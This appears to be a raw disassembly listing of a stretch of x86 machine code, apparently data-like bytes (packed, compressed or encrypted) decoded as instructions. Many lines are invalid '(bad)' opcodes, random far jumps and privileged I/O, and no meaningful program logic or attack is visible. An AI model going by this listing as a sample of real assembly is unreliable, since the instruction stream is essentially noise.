  41ee3a:	std    
  41ee3b:	(bad)  
  41ee3c:	cmp    al,0xb9
  41ee3e:	ins    DWORD PTR es:[edi],dx
  41ee3f:	je     0x41edef
  41ee41:	dec    esp
  41ee42:	shl    DWORD PTR [edx],1
  41ee44:	rcr    cl,cl
  41ee46:	pop    eax
  41ee47:	jne    0x41eded
  41ee49:	jge    0x41ee6d
  41ee4b:	xor    edx,DWORD PTR [edx]
  41ee4d:	pop    es
  41ee4e:	ret    0x1ce6
  41ee51:	aad    0x9b
  41ee53:	sub    DWORD PTR [edx+edi*1-0x4b],0x22c306ef
  41ee5b:	xor    esi,0x3f
  41ee5e:	int3   
  41ee5f:	pop    dx
  41ee61:	sbb    bh,BYTE PTR [eax-0x64289c82]
  41ee67:	push   edx
  41ee68:	cmp    eax,0x7ce9098c
  41ee6d:	hlt    
  41ee6e:	cmc    
  41ee6f:	cmp    DWORD PTR [ecx+0xe],edx
  41ee72:	stc    
  41ee73:	sbb    eax,0xb1064ba1
  41ee78:	(bad)  
  41ee79:	out    dx,al
  41ee7a:	xchg   esp,eax
  41ee7b:	mov    esp,0x9006da3f
  41ee80:	xor    DWORD PTR [ebp+0x17],ebx
  41ee83:	data16 or al,0x64
  41ee86:	mov    al,0x1a
  41ee88:	push   0xffffffc0
  41ee8a:	(bad)  
  41ee8b:	daa    
  41ee8c:	cli    
  41ee8d:	imul   ecx,DWORD PTR [edx-0x2a],0xfe9ef02f
  41ee94:	mov    cs,WORD PTR [edi+esi*2+0xc]
  41ee98:	jae    0x41ee82
  41ee9a:	mov    esi,0xcec5e920
  41ee9f:	aas    
  41eea0:	push   ebp
  41eea1:	in     al,0x4f
  41eea3:	mov    al,ds:0xd7dde0c4
  41eea8:	repnz pop ebx
  41eeaa:	sub    BYTE PTR [edx-0x7decbb0a],al
  41eeb0:	lds    eax,FWORD PTR [edi+0x3285024f]
  41eeb6:	push   eax
  41eeb7:	jbe    0x41ee6b
  41eeb9:	mov    DWORD PTR [ebx+0x3d],edx
  41eebc:	ret    
  41eebd:	adc    eax,0x1ebb4fe9
  41eec2:	xor    DWORD PTR [eax],ebp
  41eec4:	aaa    
  41eec5:	fs paddw mm3,mm4
  41eec9:	inc    edx
  41eeca:	jmp    0x8a175f7a
  41eecf:	mov    bh,0x40
  41eed1:	scas   eax,DWORD PTR es:[edi]
  41eed2:	or     BYTE PTR [edx-0x45f58415],bl
  41eed8:	mov    al,0xe3
  41eeda:	push   esp
  41eedb:	(bad)  [esi-0x48b2fd49]
  41eee1:	(bad)  
  41eee2:	jne    0x41eec6
  41eee4:	mov    bl,BYTE PTR [esi-0x1]
  41eee7:	inc    ebp
  41eee8:	xchg   edx,eax
  41eee9:	daa    
  41eeea:	or     BYTE PTR [esi-0x17],dl
  41eeed:	inc    esi
  41eeee:	out    dx,al
  41eeef:	sti    
  41eef0:	daa    
  41eef1:	fmul   QWORD PTR [ebx-0x5bf28867]
  41eef7:	out    0x16,al
  41eef9:	jno    0x41ef47
  41eefb:	lahf   
  41eefc:	in     al,0x7e
  41eefe:	test   BYTE PTR [ebx-0x594657bc],ah
  41ef04:	mov    ds,esi
  41ef06:	inc    edx
  41ef07:	add    BYTE PTR [ecx],ch
  41ef09:	out    0x67,al
  41ef0b:	or     esp,esi
  41ef0d:	je     0x41ef57
  41ef0f:	xchg   esp,eax
  41ef10:	aad    0x6f
  41ef12:	shl    dl,0xe0
  41ef15:	loopne 0x41ef81
  41ef17:	ins    BYTE PTR es:[edi],dx
  41ef18:	jle    0x41ef0a
  41ef1a:	lea    ecx,[edx+eiz*1]
  41ef1d:	dec    ebx
  41ef1e:	jmp    0xf80e49b9
  41ef23:	lock dec ecx
  41ef25:	push   ecx
  41ef26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef27:	cmp    edi,ecx
  41ef29:	xchg   ebp,eax
  41ef2a:	in     eax,0x4
  41ef2c:	lds    edx,FWORD PTR [ebx+0x48]
  41ef2f:	push   es
  41ef30:	mov    ds:0xe2f5c170,eax
  41ef35:	sub    ebp,DWORD PTR [edx+0x7888290a]
  41ef3b:	in     al,0xa
  41ef3d:	int3   
  41ef3e:	jg     0x41ef24
  41ef40:	pop    es
  41ef41:	dec    edx
  41ef42:	push   eax
  41ef43:	jo     0x41eec8
  41ef45:	dec    ebx
  41ef46:	dec    esi
  41ef47:	sbb    BYTE PTR [edx+edi*1-0x72],ch
  41ef4b:	pop    ds
  41ef4c:	or     DWORD PTR [edx+0xa],edi
  41ef4f:	dec    edx
  41ef50:	jle    0x41ef9c
  41ef52:	pop    edx
  41ef53:	inc    edx
  41ef54:	dec    ebp
  41ef55:	outs   dx,BYTE PTR ds:[esi]
  41ef56:	add    eax,0x50e8f964
  41ef5b:	jecxz  0x41ef77
  41ef5d:	dec    ecx
  41ef5e:	je     0x41ef8e
  41ef60:	retf   
  41ef61:	or     DWORD PTR [ebp+0x77486940],0x519fb08f
  41ef6b:	mov    bh,0x1e
  41ef6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef6e:	mov    ebp,0x421bacdb
  41ef73:	xor    eax,0x78244185
  41ef78:	paddsb mm0,mm7
  41ef7b:	xor    eax,0x8ac2150
  41ef80:	push   edi
  41ef81:	and    eax,0xcab4c67e
  41ef86:	aas    
  41ef87:	add    DWORD PTR [esi],ebx
  41ef89:	adc    cl,bl
  41ef8b:	sbb    al,0xb2
  41ef8d:	out    dx,al
  41ef8e:	(bad)  
  41ef8f:	(bad)  
  41ef90:	ja     0x41effe
  41ef92:	out    0x6a,eax
  41ef94:	(bad)  
  41ef95:	xchg   ebx,eax
  41ef96:	pop    es
  41ef97:	lods   al,BYTE PTR ds:[esi]
  41ef98:	xchg   ebx,eax
  41ef99:	mov    ecx,0xacc5c721
  41ef9e:	(bad)  
  41efa0:	imul   ebx,DWORD PTR [edi+0x7c],0xbe0abe7b
  41efa7:	push   ebx
  41efa8:	pop    esp
  41efa9:	dec    esi
  41efaa:	xor    DWORD PTR [edi+0x28],eax
  41efad:	cmp    BYTE PTR [esi-0x14],cl
  41efb0:	xor    DWORD PTR [esi+eiz*1],ebx
  41efb3:	int3   
  41efb4:	cmp    ah,0x46
  41efb7:	mov    esi,0x71923bea
  41efbc:	adc    BYTE PTR [esi],dl
  41efbe:	add    BYTE PTR ds:0x6b90edf6,dl
  41efc4:	jbe    0x41efd9
  41efc6:	sub    ch,BYTE PTR [edx+edi*8-0x70d00715]
  41efcd:	lahf   
  41efce:	inc    esi
  41efcf:	outs   dx,DWORD PTR ds:[esi]
  41efd0:	fiadd  WORD PTR [ebx+0x0]
  41efd3:	add    DWORD PTR ds:0xed48e627,esi
  41efd9:	jne    0x41f012
  41efdb:	in     eax,dx
  41efdc:	xchg   ebx,eax
  41efdd:	sbb    eax,0x5632de92
  41efe2:	xchg   BYTE PTR [edx],dh
  41efe4:	mov    al,0x46
  41efe6:	push   ss
  41efe7:	add    al,0xf2
  41efe9:	add    BYTE PTR [ebx],cl
  41efeb:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41efed:	push   ecx
  41efee:	mov    dh,0xa8
  41eff0:	push   cs
  41eff1:	mov    bh,0x1f
  41eff3:	jp     0x41f025
  41eff5:	bound  esi,QWORD PTR [esi+0x71]
  41eff8:	mov    al,0xed
  41effa:	out    dx,al
  41effb:	and    eax,0xb7c08ed5
  41f000:	add    ch,bl
  41f002:	xchg   edx,eax
  41f003:	mov    ecx,0x3ec3925a
  41f008:	mov    ds:0xd12f326e,al
  41f00d:	or     al,0x50
  41f00f:	fistp  WORD PTR [esi+0xd9c7678]
  41f015:	mov    al,ds:0xac251733
  41f01a:	int3   
  41f01b:	in     eax,0x98
  41f01d:	push   ebx
  41f01e:	mov    DWORD PTR [edx+0x4e],esi
  41f021:	nop
  41f022:	sbb    eax,0x7000c003
  41f027:	es pushf 
  41f029:	ror    BYTE PTR [esp+eiz*2],1
  41f02c:	xlat   BYTE PTR ds:[ebx]
  41f02d:	fsubr  QWORD PTR [eax-0x2e9e82cb]
  41f033:	fadd   QWORD PTR [edi+0x38]
  41f036:	nop
  41f037:	mov    DWORD PTR [ecx-0x772d96e5],0xfcf4e69c
  41f041:	sbb    BYTE PTR [eax+0x128155ec],cl
  41f047:	add    eax,0x6e7c3f1b
  41f04c:	aam    0xf0
  41f04e:	(bad)  
  41f04f:	push   esi
  41f050:	mov    edx,0x795cfd53
  41f055:	jae    0x41f052
  41f057:	mov    ah,0x6c
  41f059:	inc    edx
  41f05a:	inc    edx
  41f05b:	out    dx,al
  41f05c:	pop    ecx
  41f05d:	push   0xa97abd3b
  41f062:	in     al,0x7a
  41f064:	xchg   ecx,eax
  41f065:	loopne 0x41f085
  41f067:	xchg   ecx,eax
  41f068:	in     al,0x83
  41f06a:	pop    edi
  41f06b:	ja     0x41f0e3
  41f06d:	lds    ebp,FWORD PTR [ecx-0x7c8615d2]
  41f073:	in     al,dx
  41f074:	jmp    0x41f0eb
  41f076:	data16 js 0x41f067
  41f079:	jmp    0x8017:0xff540da3
  41f080:	and    eax,0x47d57324
  41f085:	mov    al,ds:0x44d73add
  41f08a:	xchg   ebx,eax
  41f08b:	pop    edx
  41f08c:	fwait
  41f08d:	mov    edi,0x919c2395
  41f092:	or     ah,BYTE PTR ds:0xf4b04e53
  41f098:	bound  edi,QWORD PTR [edx+eax*1]
  41f09b:	xchg   ebx,eax
  41f09c:	scas   al,BYTE PTR es:[edi]
  41f09d:	mov    eax,0x5f320d86
  41f0a2:	xchg   BYTE PTR ds:0x9053e826,ch
  41f0a8:	add    al,0x49
  41f0aa:	pop    ebp
  41f0ab:	push   edx
  41f0ac:	ss scas al,BYTE PTR es:[edi]
  41f0ae:	repnz (bad) 
  41f0b1:	push   ebp
  41f0b2:	popa   
  41f0b3:	idiv   DWORD PTR [ecx]
  41f0b5:	lock in al,dx
  41f0b7:	inc    ebp
  41f0b8:	mov    dh,0xb6
  41f0ba:	into   
  41f0bb:	pop    ss
  41f0bc:	nop
  41f0bd:	rol    DWORD PTR [edi],0x2a
  41f0c0:	and    ebp,ecx
  41f0c2:	jns    0x41f103
  41f0c4:	sub    eax,0x1117c0cf
  41f0c9:	mov    DWORD PTR [edx-0x4bcc868a],0x329a9d6b
  41f0d3:	sbb    al,0xe7
  41f0d5:	test   al,0x17
  41f0d7:	inc    ebp
  41f0d8:	push   ds
  41f0d9:	sbb    ecx,DWORD PTR [esp+ebp*4+0x3c]
  41f0dd:	cdq    
  41f0de:	mov    ds:0x42772db6,al
  41f0e3:	lahf   
  41f0e4:	lahf   
  41f0e5:	xor    edi,DWORD PTR [edx]
  41f0e7:	jo     0x41f07e
  41f0e9:	jmp    0x521dc35b
  41f0ee:	xchg   ebp,eax
  41f0ef:	jp     0x41f09e
  41f0f1:	repz lea ebp,[esi]
  41f0f4:	xchg   esi,eax
  41f0f5:	cmp    al,BYTE PTR [edi+0x2a8a55d3]
  41f0fb:	mov    ds:0x943ba46b,eax
  41f100:	dec    ebp
  41f101:	dec    eax
  41f102:	cli    
  41f103:	jno    0x41f155
  41f105:	mov    DWORD PTR [edi],esi
  41f107:	jecxz  0x41f142
  41f109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f10a:	add    ebp,DWORD PTR [ecx+ebx*1]
  41f10d:	data16 fs jmp 0x41f177
  41f111:	and    edi,DWORD PTR ss:[eax+0x75]
  41f115:	sub    BYTE PTR [esi+0x56e2739e],ch
  41f11b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f11c:	retf   0xb779
  41f11f:	shr    BYTE PTR [edx],cl
  41f121:	add    eax,0xfd38eb27
  41f126:	jae    0x41f145
  41f128:	shl    cl,1
  41f12a:	aaa    
  41f12b:	xchg   esp,eax
  41f12c:	pop    es
  41f12d:	and    BYTE PTR [edi+eax*2-0x62],ch
  41f131:	pop    dx
  41f133:	shr    DWORD PTR [ecx+0x469c751f],1
  41f139:	mov    ch,0xd8
  41f13b:	xor    BYTE PTR [esi+0x30a2d8a1],ch
  41f141:	in     al,dx
  41f142:	sub    al,0xac
  41f144:	mov    ?,ebp
  41f146:	(bad)  [ecx]
  41f148:	sti    
  41f149:	adc    dl,ch
  41f14b:	mov    bh,0xe7
  41f14d:	imul   esp,ebp,0xffffffbb
  41f150:	les    esp,FWORD PTR [eax-0x47f3645d]
  41f156:	sub    eax,0x58dc7995
  41f15b:	rol    BYTE PTR [eax-0x33],1
  41f15e:	les    esi,FWORD PTR ds:[edx+0x572cb061]
  41f165:	add    eax,0xb01f7f47
  41f16a:	daa    
  41f16b:	add    DWORD PTR [ebx+0x1f],ebx
  41f16e:	sub    dh,ah
  41f170:	out    dx,eax
  41f171:	push   ebx
  41f172:	pushf  
  41f173:	or     al,0x3a
  41f175:	mov    edi,0xc4a64d15
  41f17a:	xlat   BYTE PTR ds:[ebx]
  41f17b:	push   eax
  41f17c:	mov    eax,ds:0xd9a66453
  41f181:	outs   dx,DWORD PTR ds:[esi]
  41f182:	in     al,0xe3
  41f184:	mov    cl,0x54
  41f186:	clc    
  41f187:	cmp    al,0xad
  41f189:	mov    ss,edx
  41f18b:	xchg   edi,eax
  41f18c:	inc    edi
  41f18d:	mov    bh,0xb2
  41f18f:	cld    
  41f190:	inc    edi
  41f191:	mov    cl,0xee
  41f193:	ja     0x41f1ac
  41f195:	imul   edx,DWORD PTR [esi-0x53],0x412ffbd
  41f19c:	pop    edi
  41f19d:	imul   ebx,DWORD PTR [esi],0xdb39141c
  41f1a3:	mov    dl,0x98
  41f1a5:	mov    esi,0xad0d6ad7
  41f1aa:	jle    0x41f1ec
  41f1ac:	(bad)  
  41f1ad:	in     eax,0x49
  41f1af:	test   DWORD PTR [eax-0x40d04c6f],eax
  41f1b5:	inc    eax
  41f1b6:	rol    BYTE PTR [esi+0x47],0xfd
  41f1ba:	jae    0x41f18e
  41f1bc:	iret   
  41f1bd:	cmp    esi,DWORD PTR [edi]
  41f1bf:	fadd   QWORD PTR [ebx]
  41f1c1:	or     BYTE PTR [esi],0x53
  41f1c4:	adc    al,0x95
  41f1c6:	xchg   ebx,eax
  41f1c7:	mov    ds,WORD PTR [ecx-0x12]
  41f1ca:	mov    bh,0x5f
  41f1cc:	repz rcr BYTE PTR [ecx],0xc7
  41f1d0:	hlt    
  41f1d1:	hlt    
  41f1d2:	fcmovbe st,st(6)
  41f1d4:	or     al,0xb8
  41f1d6:	mov    ebp,0x6227764
  41f1db:	scas   al,BYTE PTR es:[edi]
  41f1dc:	adc    ebp,DWORD PTR [ebx+edx*2+0x5]
  41f1e0:	mov    ah,0x60
  41f1e2:	clc    
  41f1e3:	dec    ecx
  41f1e4:	pop    ecx
  41f1e5:	sahf   
  41f1e6:	sbb    edi,esi
  41f1e8:	cmp    al,0x37
  41f1ea:	ret    
  41f1eb:	push   ebp
  41f1ec:	jmp    0xca59:0x825e2df2
  41f1f3:	loop   0x41f1ae
  41f1f5:	in     eax,dx
  41f1f6:	(bad)  
  41f1f7:	cmp    DWORD PTR [ebp-0x5fd26ee],esi
  41f1fd:	mov    bh,0x56
  41f1ff:	mov    eax,0x49d1da60
  41f204:	bound  esi,QWORD PTR [eax-0x2]
  41f207:	int    0xaa
  41f209:	xchg   edi,eax
  41f20a:	jp     0x41f1c2
  41f20c:	add    DWORD PTR [ebx+0x1f618cc1],edx
  41f212:	je     0x41f1db
  41f214:	popa   
  41f215:	sub    eax,0x44c68fb0
  41f21a:	outs   dx,BYTE PTR ds:[esi]
  41f21b:	dec    edi
  41f21c:	hlt    
  41f21d:	aam    0x36
  41f21f:	sti    
  41f220:	loopne 0x41f1d6
  41f222:	in     eax,dx
  41f223:	push   edi
  41f224:	pusha  
  41f225:	popf   
  41f226:	mov    edi,edi
  41f228:	mov    dl,0x4e
  41f22a:	and    ebx,ebx
  41f22c:	jbe    0x41f1c2
  41f22e:	inc    eax
  41f22f:	(bad)  
  41f230:	pop    ds
  41f231:	int3   
  41f232:	mov    eax,0xd89c3ba3
  41f237:	and    esi,edi
  41f239:	gs lahf 
  41f23b:	jno    0x41f219
  41f23d:	dec    eax
  41f23e:	jg     0x41f213
  41f240:	push   esi
  41f241:	es (bad) 
  41f243:	in     eax,dx
  41f244:	out    0x6f,eax
  41f246:	(bad)  
  41f247:	cld    
  41f248:	fist   WORD PTR [esi+ebx*1]
  41f24b:	jne    0x41f26e
  41f24d:	pop    ecx
  41f24e:	or     DWORD PTR [edx-0xe],edx
  41f251:	or     DWORD PTR [esp+edx*2+0xcec9c0a],0x37e527cc
  41f25c:	inc    ecx
  41f25d:	gs push 0x89f9ab4f
  41f263:	mov    ?,WORD PTR [esi-0x7cc6f951]
  41f269:	xchg   ebx,eax
  41f26a:	out    dx,al
  41f26b:	icebp  
  41f26c:	sub    DWORD PTR [edi+0x52169603],ecx
  41f272:	push   ebp
  41f273:	cld    
  41f274:	repz pop esp
  41f276:	fbld   TBYTE PTR [ebx+0x764195f5]
  41f27c:	add    al,0x48
  41f27e:	ins    BYTE PTR es:[edi],dx
  41f27f:	shr    BYTE PTR ds:0x484aaa03,0xf6
  41f286:	mov    dh,0xb5
  41f288:	out    0x97,eax
  41f28a:	add    al,0xbc
  41f28c:	sbb    al,0xf4
  41f28e:	dec    esp
  41f28f:	xor    ecx,DWORD PTR ds:0x29c1fc89
  41f295:	bound  eax,QWORD PTR [esi+edx*4]
  41f298:	mov    al,ds:0x167ca8d1
  41f29d:	pop    edx
  41f29e:	xor    DWORD PTR [ebx],ebp
  41f2a0:	cmp    al,0x29
  41f2a2:	leave  
  41f2a3:	popa   
  41f2a4:	lods   al,BYTE PTR ds:[esi]
  41f2a5:	mov    dl,0xfe
  41f2a7:	pop    esi
  41f2a8:	fdiv   st,st(4)
  41f2aa:	pusha  
  41f2ab:	xor    BYTE PTR [ecx+0x2a0bf143],0x14
  41f2b2:	jo     0x41f2e0
  41f2b4:	mul    BYTE PTR ss:[ebp+edi*2-0x6cbb9609]
  41f2bc:	mov    ebx,0xd2d0babe
  41f2c1:	(bad)  
  41f2c2:	dec    eax
  41f2c3:	mov    es,WORD PTR [esi+0xca80b92]
  41f2c9:	pop    ebp
  41f2ca:	jmp    0x9ef1:0x5289e015
  41f2d1:	pop    esp
  41f2d2:	enter  0x5527,0xe6
  41f2d6:	sti    
  41f2d7:	in     al,0x3
  41f2d9:	lahf   
  41f2da:	sbb    al,0x8c
  41f2dc:	mov    al,0xb1
  41f2de:	or     al,0x96
  41f2e0:	iret   
  41f2e1:	ds loopne 0x41f337
  41f2e4:	add    edx,DWORD PTR [ebx+0x0]
  41f2e7:	pop    ecx
  41f2e8:	mov    ah,0x16
  41f2ea:	push   ds
  41f2eb:	mov    edx,DWORD PTR [eax+esi*8+0x54]
  41f2ef:	mov    al,BYTE PTR ds:0xecb3151
  41f2f5:	inc    ebp
  41f2f6:	xor    DWORD PTR [ebx-0x42924665],ecx
  41f2fc:	inc    esp
  41f2fd:	out    0xc,eax
  41f2ff:	mov    eax,ds:0x9b8edeab
  41f304:	inc    esp
  41f305:	xchg   ebp,edi
  41f307:	lods   al,BYTE PTR ds:[esi]
  41f308:	cmc    
  41f309:	sub    DWORD PTR [edi-0x12a75fa5],0x4dc74c2a
  41f313:	rcl    BYTE PTR [ebp+0x54],1
  41f316:	jae    0x41f2f1
  41f318:	adc    bl,BYTE PTR [edi+0x4151ff1]
  41f31e:	fstp   TBYTE PTR [edi]
  41f320:	or     eax,0xb300caf8
  41f325:	adc    DWORD PTR [edx],0xffffff9d
  41f328:	cmp    dl,bh
  41f32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f32b:	lods   al,BYTE PTR ds:[esi]
  41f32c:	sbb    ah,dl
  41f32e:	aad    0xcc
  41f330:	or     ebx,ebp
  41f332:	push   ss
  41f333:	and    al,BYTE PTR [edx-0x4da8a602]
  41f339:	adc    esi,edi
  41f33b:	and    dl,BYTE PTR [ecx+0x4eee7ce7]
  41f341:	inc    ebp
  41f342:	jg     0x41f353
  41f344:	sar    DWORD PTR [ecx],0x76
  41f347:	sti    
  41f348:	ret    
  41f349:	ror    edx,1
  41f34b:	push   esp
  41f34c:	dec    esp
  41f34d:	lahf   
  41f34e:	pusha  
  41f34f:	fnstcw WORD PTR [ebx-0x1d]
  41f352:	les    ecx,FWORD PTR [ecx+0x63]
  41f355:	mov    BYTE PTR [eax+ebx*8-0x4e79ec0e],ch
  41f35c:	xchg   ecx,eax
  41f35d:	div    DWORD PTR [ebx+0x4e]
  41f360:	mov    ecx,0x132352f4
  41f365:	and    BYTE PTR [ebx-0x4be3e9f],0xef
  41f36c:	scas   eax,DWORD PTR es:[edi]
  41f36d:	or     edx,DWORD PTR [ecx]
  41f36f:	or     BYTE PTR [ebp+eax*1-0x890d564],0xa4
  41f377:	and    esi,esi
  41f379:	pop    DWORD PTR [eax]
  41f37b:	ret    
  41f37c:	ins    BYTE PTR es:[edi],dx
  41f37d:	or     DWORD PTR [ecx+eiz*2],edi
  41f380:	je     0x41f33a
  41f382:	pop    edx
  41f383:	mov    ds:0xe09ef2c1,al
  41f388:	test   eax,0x74b7841b
  41f38d:	loop   0x41f40c
  41f38f:	and    DWORD PTR [eax-0x182af2ed],edx
  41f395:	ds sbb eax,0x5976c7c3
  41f39b:	sub    DWORD PTR [ebp+0x32],ebp
  41f39e:	xor    DWORD PTR [ebx+0x74cf67c8],0xffffffbc
  41f3a5:	(bad)  
  41f3a6:	adc    eax,0x23eb05ed
  41f3ab:	sahf   
  41f3ac:	std    
  41f3ad:	int3   
  41f3ae:	push   esp
  41f3af:	xchg   edi,eax
  41f3b0:	pop    eax
  41f3b1:	data16 mov cl,0x11
  41f3b4:	pop    es
  41f3b5:	(bad)  
  41f3b6:	cli    
  41f3b7:	fiadd  DWORD PTR [edx+0x72]
  41f3ba:	repnz add DWORD PTR [edi+0x1c],edi
  41f3be:	(bad)  
  41f3bf:	mov    ch,0x47
  41f3c1:	dec    eax
  41f3c2:	iret   
  41f3c3:	jp     0x41f3f6
  41f3c5:	lods   al,BYTE PTR ds:[esi]
  41f3c6:	ror    BYTE PTR [edx],cl
  41f3c8:	cmp    al,0x36
  41f3ca:	and    al,cl
  41f3cc:	jbe    0x41f39c
  41f3ce:	xchg   esp,eax
  41f3cf:	cmp    eax,0x3fa18c7a
  41f3d4:	mov    cl,0x45
  41f3d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3d7:	cmp    BYTE PTR [ecx+0x1a21a01f],dl
  41f3dd:	mov    BYTE PTR [edx],ah
  41f3df:	stc    
  41f3e0:	and    al,0x4c
  41f3e2:	or     BYTE PTR ds:0xb9454ef,ah
  41f3e8:	les    ebx,FWORD PTR [eax+esi*4]
  41f3eb:	popa   
  41f3ec:	inc    esp
  41f3ed:	aam    0x5b
  41f3ef:	pusha  
  41f3f0:	shl    DWORD PTR [ecx-0x19d0bb66],0x24
  41f3f7:	imul   ebp,DWORD PTR [ecx+0x3cf6eead],0x9c98cc5a
  41f401:	adc    al,0x9c
  41f403:	lods   eax,DWORD PTR ds:[esi]
  41f404:	fcomi  st,st(4)
  41f406:	cwde   
  41f407:	hlt    
  41f408:	(bad)  
  41f409:	xchg   ecx,eax
  41f40a:	cmp    eax,0x179c5f69
  41f40f:	push   edx
  41f410:	das    
  41f411:	leave  
  41f412:	inc    esp
  41f413:	clc    
  41f414:	imul   ebx,edi,0xffffffa3
  41f417:	mov    ah,0x7
  41f419:	inc    eax
  41f41a:	mov    edi,0x3d13974d
  41f41f:	xchg   BYTE PTR [ebx-0x62],al
  41f422:	sub    ebx,esp
  41f424:	fiadd  WORD PTR [ecx-0x1cd25bdc]
  41f42a:	outs   dx,DWORD PTR ds:[esi]
  41f42b:	jmp    0x37c6:0xc2a2a2f5
  41f432:	inc    esp
  41f433:	add    DWORD PTR [esi+0x39ca2eb],esp
  41f439:	test   al,0x55
  41f43b:	addr16 mov eax,0x17d3d3e8
  41f441:	call   0x1748521f
  41f446:	xchg   esi,ebp
  41f448:	lods   eax,DWORD PTR ds:[esi]
  41f449:	js     0x41f40e
  41f44b:	enter  0xa434,0x43
  41f44f:	popf   
  41f450:	mov    BYTE PTR [ebp+0x1aadafc],0xa4
  41f457:	or     BYTE PTR [edi],dl
  41f459:	jle    0x41f3ff
  41f45b:	mov    esp,0x9f7b189f
  41f460:	rcl    BYTE PTR [esi],cl
  41f462:	ins    DWORD PTR es:[edi],dx
  41f463:	lods   al,BYTE PTR ds:[esi]
  41f464:	ins    BYTE PTR es:[edi],dx
  41f465:	or     esi,ebx
  41f467:	ins    DWORD PTR es:[edi],dx
  41f468:	stc    
  41f469:	sahf   
  41f46a:	in     eax,0xbc
  41f46c:	sti    
  41f46d:	dec    edx
  41f46e:	mov    eax,ds:0x107805d1
  41f473:	call   0xff33:0x65f60b80
  41f47a:	mov    esp,0x47fa35ba
  41f47f:	inc    esi
  41f480:	div    DWORD PTR [edi+0x34]
  41f483:	int3   
  41f484:	xchg   edx,eax
  41f485:	xchg   edi,eax
  41f486:	add    DWORD PTR [esi],ecx
  41f488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f489:	push   ebx
  41f48a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f48b:	add    esp,esp
  41f48d:	in     eax,dx
  41f48e:	scas   eax,DWORD PTR es:[edi]
  41f48f:	sbb    BYTE PTR [ecx],0x5f
  41f492:	outs   dx,BYTE PTR ds:[esi]
  41f493:	test   DWORD PTR [edi],0x2be1d55
  41f499:	rol    bl,0x3f
  41f49c:	sbb    dh,BYTE PTR [ebp-0x7d]
  41f49f:	sbb    DWORD PTR [eax+0x62],0xf72f6cea
  41f4a6:	pop    ss
  41f4a7:	pop    ds
  41f4a8:	push   es
  41f4a9:	jle    0x41f528
  41f4ab:	jl     0x41f4e1
  41f4ad:	xchg   ebp,eax
  41f4ae:	das    
  41f4af:	xchg   edi,eax
  41f4b0:	shl    DWORD PTR [ebx+0x21],0x3d
  41f4b4:	div    DWORD PTR [ebx-0x2542d3b]
  41f4ba:	or     al,0x45
  41f4bc:	cmp    eax,0x63f90724
  41f4c1:	js     0x41f484
  41f4c3:	stos   DWORD PTR es:[edi],eax
  41f4c4:	mov    dl,0xb6
  41f4c6:	imul   edx,DWORD PTR [eax-0x3bbb91f9],0xfffffff7
  41f4cd:	outs   dx,BYTE PTR ds:[esi]
  41f4ce:	xor    eax,0x377774e6
  41f4d3:	fwait
  41f4d4:	lods   al,BYTE PTR ds:[esi]
  41f4d5:	sub    eax,0x214edba8
  41f4da:	scas   eax,DWORD PTR es:[edi]
  41f4db:	(bad)  
  41f4dd:	push   ebx
  41f4de:	push   ds
  41f4df:	jmp    0x41f55e
  41f4e1:	jns    0x41f49d
  41f4e3:	arpl   WORD PTR [edx-0x5b],sp
  41f4e6:	and    al,0x21
  41f4e8:	adc    al,0xf9
  41f4ea:	out    dx,eax
  41f4eb:	dec    ebx
  41f4ec:	dec    edx
  41f4ed:	mov    ch,0x42
  41f4ef:	retf   0xb11a
  41f4f2:	add    esi,DWORD PTR [ebx]
  41f4f4:	test   BYTE PTR [edx-0x1517e2bb],bh
  41f4fa:	ja     0x41f52f
  41f4fc:	jo     0x41f503
  41f4fe:	call   0x44bcc753
  41f503:	scas   eax,DWORD PTR es:[edi]
  41f504:	hlt    
  41f505:	loopne 0x41f495
  41f507:	pop    ds
  41f508:	sub    DWORD PTR [edx+0x68],esi
  41f50b:	mov    ebx,0x1ace7c91
  41f510:	add    bl,ch
  41f512:	pop    edi
  41f513:	xor    dl,bl
  41f515:	mov    bh,0x91
  41f517:	inc    ebp
  41f518:	aad    0x9c
  41f51a:	jecxz  0x41f54f
  41f51c:	mov    ah,0x7d
  41f51e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41f520:	and    al,0x5d
  41f522:	sbb    ah,BYTE PTR [ebx-0x5f]
  41f525:	in     al,dx
  41f526:	aad    0xdb
  41f528:	xchg   ecx,eax
  41f529:	lods   al,BYTE PTR ds:[esi]
  41f52a:	shl    ecx,0x58
  41f52d:	pcmpgtw mm0,QWORD PTR ds:0x7e5a3c6
  41f534:	mov    ah,BYTE PTR [edx+eiz*2+0x36d09f72]
  41f53b:	mov    esi,0x534b2668
  41f540:	sahf   
  41f541:	test   DWORD PTR [eax-0x4ab75ad7],ecx
  41f547:	push   edx
  41f548:	mov    ebp,0xe5affc6b
  41f54d:	test   BYTE PTR [edx-0x7f],dl
  41f550:	test   ah,dl
  41f552:	addr16 mov edx,0x7ff5177f
  41f558:	mov    al,0x6e
  41f55a:	es xchg esi,eax
  41f55c:	and    ebp,DWORD PTR [ebx-0x59e2c570]
  41f562:	(bad)  
  41f563:	mov    eax,ds:0xdd332e1d
  41f568:	jge    0x41f529
  41f56a:	outs   dx,BYTE PTR ds:[esi]
  41f56b:	lods   al,BYTE PTR ds:[esi]
  41f56c:	es pop ecx
  41f56e:	loop   0x41f585
  41f570:	mov    edx,0xab39724f
  41f575:	aaa    
  41f576:	dec    ebp
  41f577:	push   es
  41f578:	cmp    al,0xd6
  41f57a:	pushf  
  41f57b:	push   0x6cd7062d
  41f580:	scas   eax,DWORD PTR es:[edi]
  41f581:	or     DWORD PTR [ecx+0x1d],ebx
  41f584:	jl     0x41f5cc
  41f586:	xor    al,0xc5
  41f588:	push   0xffffffe5
  41f58a:	pop    esp
  41f58b:	pop    es
  41f58c:	test   al,0x4d
  41f58e:	fisub  DWORD PTR [ecx]
  41f590:	xor    DWORD PTR ds:0xbd6a16bd,eax
  41f596:	and    al,0xe1
  41f598:	dec    cx
  41f59a:	mov    ebx,0xe73059d4
  41f59f:	test   al,0x8b
  41f5a1:	push   edx
  41f5a2:	aaa    
